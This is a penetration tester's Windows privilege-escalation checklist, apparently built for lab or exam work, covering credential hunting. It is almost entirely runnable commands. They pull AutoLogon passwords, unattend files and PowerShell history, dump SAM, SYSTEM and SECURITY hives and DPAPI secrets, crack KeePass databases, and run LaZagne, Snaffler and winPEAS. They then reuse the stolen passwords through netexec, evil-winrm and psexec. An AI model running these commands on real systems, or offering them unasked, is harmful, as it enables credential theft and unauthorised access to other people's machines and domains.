# Windows privesc: credential hunting

## AutoLogon and saved credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "DefaultUserName DefaultDomainName DefaultPassword AutoAdminLogon"
cmdkey /list
- [ ] An entry in cmdkey for another user: runas /savecred, in :Pb runas

## Unattended install files
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattend\Unattend.xml
type C:\Windows\System32\Sysprep\sysprep.xml
type C:\Windows\System32\sysprep.inf
type C:\unattend.xml
- [ ] PlainText true: the value is the password as it stands
A value in base64, decoded on Kali:
echo 'THE-BASE64' | base64 -d | iconv -f UTF-16LE -t UTF-8
- [ ] Windows adds the word Password, or AdministratorPassword, to the end: cut it off

## PowerShell history and transcripts
type (Get-PSReadLineOption).HistorySavePath
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -ErrorAction SilentlyContinue | ForEach-Object { "== $_"; Get-Content $_ }
Get-ChildItem C:\Users, C:\Transcripts -Recurse -Force -Include PowerShell_transcript* -ErrorAction SilentlyContinue

## Files
findstr /si /m "password" C:\Users\*.txt C:\Users\*.xml C:\Users\*.ini C:\Users\*.config C:\inetpub\*.config
Get-ChildItem C:\Users, C:\inetpub, C:\xampp -Recurse -Force -Include *.config,*.ini,*.xml,*.txt,*.ps1 -File -ErrorAction SilentlyContinue | Select-String -Pattern "password|pwd|secret|connectionString" -List
Files that are a credential by their kind:
Get-ChildItem C:\Users -Recurse -Force -Include *.kdbx,*.rdp,*.vnc,id_rsa*,*.ppk,unattend.xml -File -ErrorAction SilentlyContinue
type C:\inetpub\wwwroot\web.config
type C:\xampp\passwords.txt
A .kdbx, sent back into loot/ and cracked on Kali:
keepass2john <File> > kdbx.hash
john --wordlist=/usr/share/wordlists/rockyou.txt kdbx.hash

## The registry and other stores
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s
reg query HKLM\SOFTWARE\RealVNC\WinVNC4 /v password
reg query HKLM\SOFTWARE\TightVNC\Server /s
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
netsh wlan show profiles
netsh wlan show profile name="THE-SSID" key=clear

## SAM and SYSTEM
As an administrator, or with SeBackupPrivilege:
reg save HKLM\SAM C:\Users\Public\sam.hive
reg save HKLM\SYSTEM C:\Users\Public\system.hive
reg save HKLM\SECURITY C:\Users\Public\security.hive
Old copies a normal user may read:
dir C:\Windows\Repair, C:\Windows\System32\config\RegBack
At the pwn-broker prompt: tool install impacket and tool install netexec.
The hives, sent back into loot/, on Kali:
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL
Or from Kali, with an administrator's password, the hives, LSA secrets and DPAPI secrets in one go:
nxc smb <TargetIP> -u '<Username>' -p '<Password>' --local-auth --sam --lsa --dpapi
- [ ] SAM readable by BUILTIN\Users: HiveNightmare, :Pb windows-kernel

## DPAPI
Credential Manager blobs, and the master keys that open them:
Get-ChildItem -Force $env:APPDATA\Microsoft\Credentials, $env:LOCALAPPDATA\Microsoft\Credentials
Get-ChildItem -Force -Recurse $env:APPDATA\Microsoft\Protect
whoami /user
- [ ] THE-MASTERKEY and THE-CREDENTIAL sent back into loot/, and THE-SID from whoami /user
On Kali, with the user's password:
impacket-dpapi masterkey -file THE-MASTERKEY -sid THE-SID -password '<Password>'
impacket-dpapi credential -file THE-CREDENTIAL -key THE-KEY
- [ ] THE-KEY is the Decrypted key line the first command printed

## LaZagne
At the pwn-broker prompt:
tool install lazagne
serve
serve files lazagne
On the target, as the user whose secrets I want, since DPAPI ties them to that user:
cd C:\Users\Public
- [ ] LaZagne.exe fetched here with the line serve files gives
.\LaZagne.exe all
.\LaZagne.exe browsers

## Snaffler, for the domain's shares
At the pwn-broker prompt:
tool install snaffler
serve files snaffler
On a domain-joined host, as a domain user, with Snaffler.exe fetched to C:\Users\Public:
.\Snaffler.exe -s -d <Domain> -c <DCHost> -o C:\Users\Public\snaffler.log
- [ ] Black and Red findings first, then Yellow

## winPEAS
peass-ng's winPEASx64.exe, from tool install peass-ng and serve, as in :Pb windows-enum:
.\winPEASx64.exe quiet windowscreds filesinfo

## Use what I find
nxc smb <TargetIP> -u '<Username>' -p '<Password>' --local-auth
nxc smb <TargetIP> -d <Domain> -u '<Username>' -p '<Password>'
evil-winrm -i <TargetIP> -u '<Username>' -p '<Password>'
impacket-psexec '<Username>:<Password>'@<TargetIP>
- [ ] psexec gives SYSTEM; evil-winrm gives the user itself
- [ ] No remote login works: RunasCs, :Pb runas
- [ ] Each new password tried against every user I know
